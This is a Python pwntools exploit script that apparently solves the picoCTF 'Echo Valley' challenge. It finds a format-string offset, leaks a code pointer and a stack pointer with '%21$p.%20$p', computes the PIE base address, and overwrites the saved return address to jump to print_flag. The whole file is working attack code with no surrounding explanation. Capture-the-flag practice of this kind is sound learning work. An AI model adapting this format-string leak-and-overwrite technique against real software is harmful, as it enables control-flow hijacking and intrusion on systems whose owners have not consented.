from pwn import *

binary = './valley'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('shape-facility.picoctf.net', 65453)

def exec_fmt(payload):
    p = process(binary)
    p.recvuntil(b'Welcome to the Echo Valley, Try Shouting:')
    p.sendline(payload)
    p.recvuntil(b'You heard in the distance: ')
    recv = p.recv()
    p.close()
    return recv

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

r.recvuntil(b'Welcome to the Echo Valley, Try Shouting:')

r.sendline(b'%21$p.%20$p')
r.recvuntil(b'You heard in the distance: ')
leak = r.recvline().strip().split(b'.')
main_address_ = int(leak[0], 16)
stack_address = (int(leak[1], 16))
log.info(f'main_address_: {hex(main_address_)}')

base_address = main_address_ - (0x555555555413 - 0x555555554000)
log.info(f'base_address: {hex(base_address)}')

ret_address = stack_address + 8

payload = fmtstr_payload(offset, { ret_address: base_address + e.sym['print_flag'] }, write_size='short')
r.sendline(payload)
r.sendline(b'exit')

r.interactive()
